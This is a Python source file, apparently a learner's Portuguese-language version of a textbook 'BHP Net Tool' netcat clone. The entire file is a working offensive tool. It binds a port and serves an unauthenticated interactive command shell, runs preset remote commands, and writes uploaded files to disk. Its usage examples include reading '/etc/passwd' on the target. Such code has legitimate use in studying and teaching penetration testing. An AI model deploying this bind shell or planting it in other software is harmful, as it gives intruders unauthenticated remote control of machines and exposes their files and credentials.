import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()
            print ('ENVIANDO COMANDO....')

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        print ('''Aguardando comandos....
           Exemplos:  
            >ls -l /
            >ifconfig
            >cat /etc/passwd''')
        if self.buffer:
           self.socket.send(self.buffer)
          
        try:
            while True:
                recv_len = 1
                response = ''
               
                while recv_len:
                    data = self.socket.recv (4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('Aguardando comando a Seguir>>>')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
                        
        except KeyboardInterrupt:
            print ('Interrompido pelo Cliente/Usuário (CTRL+C)')
            self.socket.close()
            sys.exit()
        except Exception as e:
            print(f'Finalizado pelo Cliente/Usuário (CTRL+D) {e}')
            self.socket.close()
            sys.exit()
        
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        try:
            while True:
                client_socket, _ = self.socket.accept()
                client_thread = threading.Thread(target=self.handle, args=(client_socket,))
                client_thread.start()
                print ('Conexão iniciada no Servidor/Usuário (CTRL+D)')
            
        except KeyboardInterrupt:
            print ('Interrompido pelo Servidor/Usuário (CTRL+C)')
            self.socket.close()
            sys.exit()
        except Exception as e:
            print(f'Finalizado pelo Servidor/Usuário (CTRL+D) - INFO:{e}')
            self.socket.close()
            sys.exit()    

    def handle(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
            
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                    print(len(file_buffer))
                else: 
                    break

            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
                message = f'Arquivo Salvo {self.args.upload}'
                client_socket.send(message.encode())

        elif self.args.command:
            cmd_buffer = b''
            print('Comando "CTRL+D" Recebido')
            
            while True:
                try:
                    client_socket.send (b'#BHP_NET_TOOL_H4ck3r#')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer =b''
                except KeyboardInterrupt:
                    print ('Interrompido pelo Cliente/Usuário (CTRL+C)')
                    self.socket.close()
                    sys.exit()
                except Exception as e:
                    print(f'Finalizado pelo Cliente/Usuário (CTRL+D), {e}')
                    self.socket.close()
                    sys.exit()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="BHP Net Tool_H4ck3r",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Exemplo:
                            netcat.py -t 192.168.1.108 -p 5555 -l -c #Shell de comando #CTRL+D após conectar
                            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytext.txt #Upload de arquivo
                            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" #Executar comando
                            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 #Envia texto na porta 135 do servidor
                            netcat.py -t 192.168.1.108 -p 5555 #Conecta ao servidor'''))
            
    parser.add_argument('-c', '--command', action='store_true', help='Shell de comando, para usar LEMBRE-SE DE USAR CTRL+D após iniciar')
    parser.add_argument('-e', '--execute', help='Executar comando especificado')
    parser.add_argument('-l', '--listen', action='store_true', help='Ouvir')
    parser.add_argument('-p', '--port', type=int, default=1234, help='Porta')
    parser.add_argument('-t', '--target', default='127.0.0.1', help='Endereço IP')
    parser.add_argument('-u', '--upload', help='Upload file')
    args = parser.parse_args()

    if args.listen:
        buffer = ''
        print ('Escutando....') 
    else:
        buffer = sys.stdin.read()
        
    nc = NetCat(args, buffer.encode())
    print ('Rodando o Programinha....')
    nc.run()
    print ('Fechando o programa.....BYE')
